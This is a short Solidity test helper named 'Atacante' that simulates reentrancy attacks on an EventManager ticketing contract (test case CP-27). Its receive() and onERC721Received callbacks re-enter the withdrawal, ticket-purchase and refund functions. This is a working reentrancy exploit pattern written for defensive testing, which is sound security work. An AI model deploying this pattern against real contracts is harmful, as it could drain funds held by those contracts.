// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IEventManagerAtacante {
    function retirarFondos() external;
    function reclamarReembolso(uint256 tokenId) external;
    function comprarEntrada(
        uint256 idEvento,
        bytes32 compromiso,
        bytes calldata firmaVerificador
    ) external payable returns (uint256);
}

/**
 * @title Atacante
 * @notice Contrato diseñado para simular ataques de reentrancia en EventManager (CP-27).
 */
contract Atacante {
    IEventManagerAtacante public immutable eventManager;
    uint8 public modoAtaque; // 2 = reentrar en comprarEntrada, 3 = reentrar en reclamarReembolso

    constructor(address _eventManager) {
        eventManager = IEventManagerAtacante(_eventManager);
    }

    function iniciarAtaqueRetiro() external {
        eventManager.retirarFondos();
    }

    function iniciarAtaqueCompra(
        uint256 idEvento,
        bytes32 compromiso,
        bytes calldata firmaVerificador,
        uint8 modo
    ) external payable {
        modoAtaque = modo;
        eventManager.comprarEntrada{value: msg.value}(idEvento, compromiso, firmaVerificador);
    }

    receive() external payable {
        eventManager.retirarFondos();
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        if (modoAtaque == 2) {
            eventManager.comprarEntrada(1, bytes32(0), "");
        } else {
            eventManager.reclamarReembolso(tokenId);
        }
        return this.onERC721Received.selector;
    }
}
